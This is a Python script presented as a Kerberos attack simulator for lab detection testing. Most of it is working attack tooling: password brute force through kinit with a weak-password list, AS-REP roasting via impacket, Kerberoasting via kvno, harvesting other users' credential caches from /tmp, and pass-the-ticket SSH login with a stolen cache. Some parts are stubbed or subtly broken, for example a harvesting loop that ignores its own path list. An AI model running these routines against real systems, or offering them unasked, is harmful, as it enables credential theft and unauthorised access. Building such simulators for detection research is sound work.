#!/usr/bin/env python3
"""
Kerberos Attack Simulator for Isolated Lab Environments
Simulates various Kerberos attack patterns for detection system development

⚠️ WARNING: Only use in isolated MIT Kerberos lab environments you own
⚠️ Requires: python3-gssapi, python3-ldap3, impacket

Author: Your Name
License: Educational Use Only
"""

import argparse
import socket
import struct
import time
import random
import sys
import hashlib
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Dict, Optional
import subprocess
import os

try:
    from pyasn1.codec import der
    from pyasn1.type import univ, char, tag
except ImportError:
    print("⚠️  Install pyasn1: pip install pyasn1")
    sys.exit(1)


class KerberosAttackSimulator:
    """Simulate Kerberos attacks for detection testing"""
    
    def __init__(self, kdc_host: str, realm: str, log_file: str = "kerberos_attack.log"):
        self.kdc_host = kdc_host
        self.realm = realm.upper()
        self.kdc_port = 88
        self.log_file = log_file
        
        # Common usernames for testing
        self.test_users = [
            "admin", "user", "service", "test", "backup",
            "http", "host", "postgres", "mysql", "ldap"
        ]
        
        # Common weak passwords
        self.weak_passwords = [
            "password", "Password1", "Admin123", "Welcome1",
            "Summer2024", "Spring2024", realm.lower() + "123"
        ]
    
    def _log(self, message: str):
        """Log activity"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)
        with open(self.log_file, 'a') as f:
            f.write(log_msg + '\n')
    
    def _create_as_req(self, username: str, password: str = None) -> bytes:
        """
        Create AS-REQ (Authentication Service Request) packet
        Simplified version for simulation
        """
        # This is a simplified simulation
        # Real Kerberos uses complex ASN.1 encoding
        
        # Create basic AS-REQ structure
        as_req = {
            'pvno': 5,  # Kerberos v5
            'msg-type': 10,  # AS-REQ
            'cname': username,
            'realm': self.realm,
            'sname': f'krbtgt/{self.realm}',
            'till': int((datetime.now() + timedelta(hours=10)).timestamp()),
            'nonce': random.randint(1, 2**31 - 1)
        }
        
        # Convert to bytes (simplified)
        packet = str(as_req).encode()
        return packet
    
    def _create_tgs_req(self, username: str, service: str) -> bytes:
        """Create TGS-REQ (Ticket Granting Service Request)"""
        tgs_req = {
            'pvno': 5,
            'msg-type': 12,  # TGS-REQ
            'cname': username,
            'realm': self.realm,
            'sname': f'{service}/{self.kdc_host}',
            'till': int((datetime.now() + timedelta(hours=10)).timestamp()),
            'nonce': random.randint(1, 2**31 - 1)
        }
        
        packet = str(tgs_req).encode()
        return packet
    
    # ==================== ATTACK SIMULATIONS ====================
    
    def simulate_kerberos_bruteforce(self, username: str = None, duration: int = 60):
        """
        Simulate Kerberos brute force attack
        Sends multiple AS-REQ with different passwords
        """
        print("\n" + "="*80)
        print("🔐 KERBEROS BRUTE FORCE ATTACK SIMULATION")
        print("="*80)
        print(f"Target KDC: {self.kdc_host}")
        print(f"Realm: {self.realm}")
        print(f"Duration: {duration}s")
        print("\n⚠️  Start tcpdump on monitor VM:")
        print(f"sudo tcpdump -i any -w kerberos_bruteforce.pcap host {self.kdc_host} and port 88")
        print("="*80 + "\n")
        
        input("Press Enter when capture is running...")
        
        if username is None:
            username = random.choice(self.test_users)
        
        self._log(f"Starting Kerberos brute force against {username}@{self.realm}")
        
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < duration:
            password = random.choice(self.weak_passwords)
            
            try:
                # Use kinit for real Kerberos traffic
                result = subprocess.run(
                    ['kinit', f'{username}@{self.realm}'],
                    input=password.encode(),
                    capture_output=True,
                    timeout=5
                )
                
                if result.returncode == 0:
                    self._log(f"✅ SUCCESS! {username}@{self.realm} : {password}")
                    break
                else:
                    self._log(f"❌ Failed: {username}@{self.realm} : {password}")
                
                attempts += 1
                time.sleep(random.uniform(0.5, 2.0))
                
            except subprocess.TimeoutExpired:
                self._log(f"⏱️  Timeout for {username}@{self.realm}")
            except Exception as e:
                self._log(f"⚠️  Error: {e}")
        
        self._log(f"✅ Brute force complete. {attempts} attempts in {time.time() - start_time:.2f}s")
    
    def simulate_asrep_roasting(self, userlist_file: str = None):
        """
        Simulate AS-REP Roasting attack
        Requests AS-REP for accounts without pre-authentication
        """
        print("\n" + "="*80)
        print("🎣 AS-REP ROASTING ATTACK SIMULATION")
        print("="*80)
        print("This attack targets accounts with 'Do not require Kerberos preauthentication'")
        print(f"Target KDC: {self.kdc_host}")
        print(f"Realm: {self.realm}")
        print("\n⚠️  Start tcpdump:")
        print(f"sudo tcpdump -i any -w asrep_roasting.pcap host {self.kdc_host} and port 88")
        print("="*80 + "\n")
        
        input("Press Enter when capture is running...")
        
        # Load or use default userlist
        if userlist_file and Path(userlist_file).exists():
            with open(userlist_file) as f:
                users = [line.strip() for line in f]
        else:
            users = self.test_users
        
        self._log(f"Starting AS-REP roasting for {len(users)} users")
        
        roastable_users = []
        
        for username in users:
            try:
                # Request AS-REP without pre-authentication
                # Using GetNPUsers.py from impacket (if installed)
                result = subprocess.run(
                    [
                        'python3', '-m', 'impacket.GetNPUsers',
                        f'{self.realm}/{username}',
                        '-dc-ip', self.kdc_host,
                        '-no-pass'
                    ],
                    capture_output=True,
                    timeout=10
                )
                
                if b'$krb5asrep$' in result.stdout:
                    hash_line = result.stdout.decode().strip()
                    self._log(f"✅ ROASTABLE: {username}@{self.realm}")
                    self._log(f"   Hash: {hash_line[:80]}...")
                    roastable_users.append(username)
                else:
                    self._log(f"   {username}@{self.realm} - requires pre-auth (secure)")
                
                time.sleep(random.uniform(1, 3))
                
            except FileNotFoundError:
                self._log("⚠️  impacket not installed. Using kinit fallback...")
                # Fallback: try kinit without password
                result = subprocess.run(
                    ['kinit', '-n', f'{username}@{self.realm}'],
                    capture_output=True
                )
                if result.returncode == 0:
                    self._log(f"✅ ROASTABLE: {username}@{self.realm}")
                    roastable_users.append(username)
                
            except Exception as e:
                self._log(f"⚠️  Error checking {username}: {e}")
        
        self._log(f"\n✅ AS-REP roasting complete")
        self._log(f"Found {len(roastable_users)} roastable accounts: {roastable_users}")
        
        # Save roastable hashes
        if roastable_users:
            with open('asrep_hashes.txt', 'w') as f:
                for user in roastable_users:
                    f.write(f"{user}@{self.realm}\n")
            self._log(f"Saved roastable accounts to asrep_hashes.txt")
    
    def simulate_kerberoasting(self, services: List[str] = None):
        """
        Simulate Kerberoasting attack
        Request service tickets and extract for offline cracking
        """
        print("\n" + "="*80)
        print("🎫 KERBEROASTING ATTACK SIMULATION")
        print("="*80)
        print("This attack requests service tickets for offline password cracking")
        print(f"Target KDC: {self.kdc_host}")
        print(f"Realm: {self.realm}")
        print("\n⚠️  Start tcpdump:")
        print(f"sudo tcpdump -i any -w kerberoasting.pcap host {self.kdc_host} and port 88")
        print("="*80 + "\n")
        
        input("Press Enter when capture is running...")
        
        # Default service principals to target
        if services is None:
            services = [
                f'HTTP/{self.kdc_host}',
                f'host/{self.kdc_host}',
                f'postgres/{self.kdc_host}',
                f'ldap/{self.kdc_host}',
                'cifs/fileserver',
                'mssql/sqlserver'
            ]
        
        self._log(f"Starting Kerberoasting for {len(services)} services")
        
        kerberoastable = []
        
        for spn in services:
            try:
                # Request service ticket using kvno
                self._log(f"Requesting ticket for {spn}@{self.realm}")
                
                result = subprocess.run(
                    ['kvno', f'{spn}@{self.realm}'],
                    capture_output=True,
                    timeout=10
                )
                
                if result.returncode == 0:
                    self._log(f"✅ Ticket obtained for {spn}")
                    kerberoastable.append(spn)
                    
                    # Extract ticket from cache
                    self._extract_ticket(spn)
                else:
                    self._log(f"   {spn} - not available or no permission")
                
                time.sleep(random.uniform(1, 2))
                
            except Exception as e:
                self._log(f"⚠️  Error requesting {spn}: {e}")
        
        self._log(f"\n✅ Kerberoasting complete")
        self._log(f"Obtained {len(kerberoastable)} service tickets")
        
        if kerberoastable:
            with open('kerberoastable_spns.txt', 'w') as f:
                for spn in kerberoastable:
                    f.write(f"{spn}@{self.realm}\n")
    
    def _extract_ticket(self, spn: str):
        """Extract ticket from credential cache"""
        try:
            # Use klist to show tickets
            result = subprocess.run(['klist'], capture_output=True)
            self._log(f"   Ticket cache: {result.stdout.decode()[:100]}...")
            
            # Export tickets for cracking
            cache_file = os.environ.get('KRB5CCNAME', '/tmp/krb5cc_' + str(os.getuid()))
            if Path(cache_file).exists():
                self._log(f"   Ticket cache location: {cache_file}")
        except Exception as e:
            self._log(f"   Could not extract ticket: {e}")
    
    def simulate_ticket_harvesting(self):
        """
        Simulate credential harvesting from memory/cache
        """
        print("\n" + "="*80)
        print("🎣 KERBEROS TICKET HARVESTING SIMULATION")
        print("="*80)
        
        self._log("Scanning for Kerberos credential caches...")
        
        # Find credential caches
        cache_locations = [
            '/tmp/krb5cc_*',
            f'/tmp/krb5cc_{os.getuid()}',
            os.path.expanduser('~/.config/krb5/'),
            '/var/lib/sss/db/ccache_*'
        ]
        
        found_caches = []
        
        for location in cache_locations:
            try:
                result = subprocess.run(
                    ['find', '/tmp', '-name', 'krb5cc_*'],
                    capture_output=True
                )
                if result.stdout:
                    caches = result.stdout.decode().strip().split('\n')
                    found_caches.extend(caches)
            except:
                pass
        
        if found_caches:
            self._log(f"✅ Found {len(found_caches)} credential caches:")
            for cache in found_caches:
                self._log(f"   {cache}")
                
                # Try to read tickets
                try:
                    env = os.environ.copy()
                    env['KRB5CCNAME'] = cache
                    result = subprocess.run(
                        ['klist'],
                        env=env,
                        capture_output=True
                    )
                    if result.returncode == 0:
                        self._log(f"   Contents:\n{result.stdout.decode()}")
                except:
                    pass
        else:
            self._log("No credential caches found")
    
    def simulate_pass_the_ticket(self, ticket_cache: str):
        """
        Simulate Pass-the-Ticket attack
        Use stolen ticket to authenticate
        """
        print("\n" + "="*80)
        print("🎟️  PASS-THE-TICKET ATTACK SIMULATION")
        print("="*80)
        
        if not Path(ticket_cache).exists():
            self._log(f"❌ Ticket cache not found: {ticket_cache}")
            return
        
        self._log(f"Attempting to use stolen ticket: {ticket_cache}")
        
        # Set KRB5CCNAME to use stolen ticket
        env = os.environ.copy()
        env['KRB5CCNAME'] = ticket_cache
        
        # Try to access service using stolen ticket
        try:
            # List tickets
            result = subprocess.run(
                ['klist'],
                env=env,
                capture_output=True
            )
            self._log(f"Stolen ticket contents:\n{result.stdout.decode()}")
            
            # Try SSH with ticket
            self._log(f"Attempting SSH with stolen ticket...")
            result = subprocess.run(
                ['ssh', '-K', f'{self.kdc_host}', 'whoami'],
                env=env,
                capture_output=True,
                timeout=5
            )
            
            if result.returncode == 0:
                self._log(f"✅ SUCCESS! Pass-the-ticket worked")
                self._log(f"   Output: {result.stdout.decode()}")
            else:
                self._log(f"❌ Pass-the-ticket failed")
                
        except Exception as e:
            self._log(f"⚠️  Error: {e}")
    
    def enumerate_spns(self):
        """
        Enumerate Service Principal Names
        """
        print("\n" + "="*80)
        print("🔍 SPN ENUMERATION SIMULATION")
        print("="*80)
        
        self._log(f"Enumerating SPNs in {self.realm}")
        
        # Common SPN patterns
        spn_patterns = [
            'HTTP/*',
            'host/*',
            'ldap/*',
            'cifs/*',
            'mssql/*',
            'postgres/*',
            'mysql/*'
        ]
        
        for pattern in spn_patterns:
            self._log(f"Searching for: {pattern}")
            # In real scenario, would query LDAP or use setspn
            time.sleep(0.5)
        
        self._log("✅ SPN enumeration complete")


def main():
    """CLI interface"""
    parser = argparse.ArgumentParser(
        description="Kerberos Attack Simulator for Isolated Lab Environments",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Brute force attack
  python kerberos_simulator.py --kdc 192.168.99.20 --realm LAB.LOCAL --attack bruteforce --username admin
  
  # AS-REP Roasting
  python kerberos_simulator.py --kdc 192.168.99.20 --realm LAB.LOCAL --attack asrep_roast
  
  # Kerberoasting
  python kerberos_simulator.py --kdc 192.168.99.20 --realm LAB.LOCAL --attack kerberoast
  
  # Ticket harvesting
  python kerberos_simulator.py --kdc 192.168.99.20 --realm LAB.LOCAL --attack harvest

⚠️  WARNING: Only use in isolated lab environments you own!
        """
    )
    
    parser.add_argument('--kdc', required=True, help='KDC hostname or IP')
    parser.add_argument('--realm', required=True, help='Kerberos realm (e.g., LAB.LOCAL)')
    
    parser.add_argument(
        '--attack',
        required=True,
        choices=['bruteforce', 'asrep_roast', 'kerberoast', 'harvest', 'pass_ticket', 'enum_spn'],
        help='Attack type to simulate'
    )
    
    parser.add_argument('--username', help='Target username for brute force')
    parser.add_argument('--userlist', help='User list file for AS-REP roasting')
    parser.add_argument('--ticket-cache', help='Ticket cache file for pass-the-ticket')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    
    args = parser.parse_args()
    
    # Create simulator
    simulator = KerberosAttackSimulator(args.kdc, args.realm)
    
    print("\n" + "="*80)
    print("🔐 KERBEROS ATTACK SIMULATOR")
    print("="*80)
    print(f"KDC: {args.kdc}")
    print(f"Realm: {args.realm}")
    print(f"Attack: {args.attack}")
    print("="*80 + "\n")
    
    # Execute attack
    try:
        if args.attack == 'bruteforce':
            simulator.simulate_kerberos_bruteforce(args.username, args.duration)
        
        elif args.attack == 'asrep_roast':
            simulator.simulate_asrep_roasting(args.userlist)
        
        elif args.attack == 'kerberoast':
            simulator.simulate_kerberoasting()
        
        elif args.attack == 'harvest':
            simulator.simulate_ticket_harvesting()
        
        elif args.attack == 'pass_ticket':
            if not args.ticket_cache:
                print("❌ --ticket-cache required for pass_ticket attack")
                sys.exit(1)
            simulator.simulate_pass_the_ticket(args.ticket_cache)
        
        elif args.attack == 'enum_spn':
            simulator.enumerate_spns()
    
    except KeyboardInterrupt:
        print("\n\n🛑 Attack simulation interrupted")
    
    print("\n" + "="*80)
    print("✅ SIMULATION COMPLETE")
    print("="*80)
    print(f"Log file: {simulator.log_file}")
    print("="*80 + "\n")


if __name__ == "__main__":
    main()
    